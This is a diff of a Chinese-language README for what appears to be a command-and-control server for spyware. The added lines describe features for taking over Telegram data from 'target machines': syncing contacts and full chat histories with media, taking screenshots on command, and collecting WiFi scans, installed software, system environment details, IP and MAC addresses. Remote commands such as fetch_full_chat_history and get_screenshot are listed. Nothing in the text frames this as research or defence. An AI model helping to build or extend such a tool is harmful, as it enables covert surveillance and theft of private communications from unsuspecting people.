@@ -79,27 +79,32 @@
 ### 核心特性
 
 1.  **设备监控 (Device Monitoring)**
-    -   支持实时监控设备在线状态。
-    -   **自动截屏监控 (`isMonitorOn`)**: 集成 Telegram 客户端的自动截屏功能，后台实时展示监控开启状态。
-    -   设备基本信息采集：操作系统版本、IP地址、地理位置等。
+    -   **实时状态**: 支持监控设备在线状态、心跳间隔。
+    -   **设备关联**: 自动关联设备 (`C2Device`) 与当前登录的 Telegram 账号 (`current_tg_id`)，实现人机对应。
+    -   **自动截屏**: 集成客户端自动截屏功能 (`isMonitorOn`)，支持截图预览与批量下载。
+    -   **基础信息**: 采集操作系统、IP (内网/外网)、MAC 地址、主机名等。
 
-2.  **数据采集 (Data Ingestion)**
-    -   **Telegram 数据同步**: 自动接收并解析客户端上传的 SQLite 数据库。
-    -   **聊天记录 (`chat_logs`)**: 解析并存储 Telegram 聊天记录，包含发送者/接收者详情（用户名、电话等）。
-    -   **用户信息 (`current_user`)**: 解析并存储当前登录的 Telegram 账户详情（是否会员等）。
-    -   **系统信息 (`system_info`)**: 解析客户端采集的系统信息。
-    -   **文件列表**: 支持文件扫描结果的上传与展示。
+2.  **深度数据采集 (Data Ingestion)**
+    -   **全量同步**: 支持接收客户端上传的 `tdata_client.db`，自动解析并同步以下数据：
+        -   **联系人 (`contacts`)**: 自动同步 Telegram 联系人至 `tg_account` 表，支持增量更新。
+        -   **聊天记录 (`chat_logs`)**: 解析聊天记录，支持文本消息及**媒体文件路径** (`media_path`) 的记录。
+        -   **WiFi 信息**: 解析 `wifi_scan_results`，记录周边 WiFi 热点信息。
+        -   **软件列表**: 解析 `installed_software`，记录目标机已安装软件。
+        -   **系统信息**: 解析 `system_info`，记录详细系统环境变量与配置。
 
-3.  **API 接口**
-    -   `/api/debug/device`: 设备调试与状态查询接口。
-    -   `/api/c2/device/*`: 设备管理相关接口，支持前端 Ant Design Pro 展示。
-    -   `/api/c2/upload`: 文件上传接口，支持 SQLite 数据库同步与截图上传。
-    -   `/api/c2Task/result`: 任务结果回传接口。
+3.  **API 接口与指令**
+    -   **管理端点**: `/api/c2Device/*` (RBAC 保护)，支持设备管理、指令下发。
+    -   **客户端端点**: `/api/c2/*` (开放/加密)，处理心跳、任务获取、结果上传。
+    -   **新增指令**: 
+        -   `fetch_full_chat_history`: 触发全量聊天记录与联系人同步。
+        -   `get_screenshot`: 实时获取屏幕截图。
 
 ### 开发注意事项
 
--   **集成测试**: 使用 `test_integration.py` 验证客户端与服务端的连通性。
--   **数据库适配**: 服务端自动适配客户端上传的 SQLite 结构，并映射至 MySQL 存储。
+-   **数据库适配**: 
+    -   后端使用 MySQL 5.7+ (`telegram_db`)。
+    -   自动解析客户端上传的 SQLite (`tdata_client.db`) 并映射至 MySQL。
+    -   **环境要求**: JDK 17, Maven 3.9+。
 
 
 ## 快速上手
